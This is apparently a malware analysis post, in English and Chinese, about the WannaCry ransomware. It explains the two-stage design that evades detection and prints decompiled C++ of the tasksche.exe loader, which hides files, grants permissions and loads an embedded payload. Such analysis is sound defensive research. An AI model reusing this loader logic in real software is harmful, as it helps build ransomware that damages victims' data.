# Wannacry in-depth analysis #

The WannaCry ransomware attack is an ongoing worldwide cyberattack by the WannaCry ransomware cryptoworm, which targets computers running the Microsoft Windows operating system by encrypting data and demanding ransom payments in the Bitcoin cryptocurrency.

The attack started on Friday, 12 May 2017, and within a day was reported to have infected more than 230,000 computers in over 150 countries. Parts of Britain's National Health Service (NHS), Spain's Telefónica, FedEx and Deutsche Bahn were hit, along with many other countries and companies worldwide.

作为一名安全行业工作者，我对WannaCry进行了深度的分析。 完整的分析可以帮助安全行业工作者了解黑客的的最新攻击手段，为防护领域的解决方案提供有价值的信息，更进一步尝试发现软件弱点，为客户提供有价值的数据恢复服务。

下面我将开始对我这2天分析的结果做一个全面的回顾。

我之前对CryptXXX，Cerber以及Locky这几种高热点勒索软件进行过深入分析，Wannacry这款勒索软件显然吸取了之前勒索软件的设计经验，并进化升级出了一个二阶段攻击方法。 什么是二阶段攻击呢？简单来讲，就是恶意程序本身并没有攻击行为，比如Wannacry程序自身并不做数据加密的工作，它会将真正具有攻击行为的代码动态释放出来，将数据加密的行为隐藏到释放出来的代码中。 这听起来很想壳的行为，比如Locky就是一款带壳的勒索软件，它运行起来后会通过壳代码释放恶意代码。 但壳代码本身也是一个很明显的特征，比如加过壳的代码无法进行反汇编，并且一般情况下信息熵很高，很多防护软件会对这种程序提高危险等级，用户一旦碰到，或者这种程序一旦Drop到用户的机器上就会被Detect到。 但是Wannacry不同，它的第一阶段程序完全没有任何壳代码，EntryPoint也没有做任何的定制，没有任何认为修改的痕迹，也许这也是Wannacry会在利用微软漏洞大规模被传播到Endpoint上没有被发现的原因吧。


**tasksche** 

Wannacry的主程序会被修改会**tasksche.exe**，起这个名字的目的是为了迷惑用户。

```C++
int __stdcall WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd)
{
  char **argv; // eax@2
  void *lpPEFile; // eax@10
  CPeBuilder *pPeBuilder; // eax@11
  void (__stdcall *fpTaskStart)(_DWORD, _DWORD); // eax@12
  CProgram Program; // [sp+10h] [bp-6E4h]@9
  char szModuleFileName[520]; // [sp+4E8h] [bp-20Ch]@1
  int nFileSize; // [sp+6F0h] [bp-4h]@10

  szModuleFileName[0] = szSelfName;
  memset(&szModuleFileName[1], 0, 516u);
  *&szModuleFileName[517] = 0;
  szModuleFileName[519] = 0;
  GetModuleFileNameA(0, szModuleFileName, 520u);
  CreateRandomSequence(szServiceName);
  if ( *_p___argc() != 2
    || (argv = _p___argv(), strcmp(*(*argv + 1), aI))
    || !CreateHiddenData(0)
    || (CopyFileA(szModuleFileName, FileName, 0), GetFileAttributesA(FileName) == INVALID_FILE_ATTRIBUTES)
    || !StartMalware() )
  {
    if ( strrchr(szModuleFileName, '\\') )
      *strrchr(szModuleFileName, '\\') = 0;
    SetCurrentDirectoryA(szModuleFileName);
    WriteRegistery(1);
    ExtractFromResource(0, WNcry);
    ModifyOneByte();
    StartProcess(CommandLine, 0, 0);            // attrib +h : Sets the hidden file attribute.
    StartProcess(aIcacls_GrantEv, 0, 0);
    if ( InitKernel32Funcs() )
    {
      CProgram::ctor(&Program);
      if ( CProgram::Initialize(&Program, 0, 0, 0) )
      {
        nFileSize = 0;
        lpPEFile = CProgram::GetPeFile(&Program, aT_wnry, &nFileSize);
        if ( lpPEFile )
        {
          pPeBuilder = WncryLoadPE(lpPEFile, nFileSize);
          if ( pPeBuilder )
          {
            fpTaskStart = WncrySeek2TaskStart(pPeBuilder, szTaskStart);
            if ( fpTaskStart )
              fpTaskStart(0, 0);
          }
        }
      }
      CProgram::dtor_0(&Program);
    }
  }
  return 0;
}
```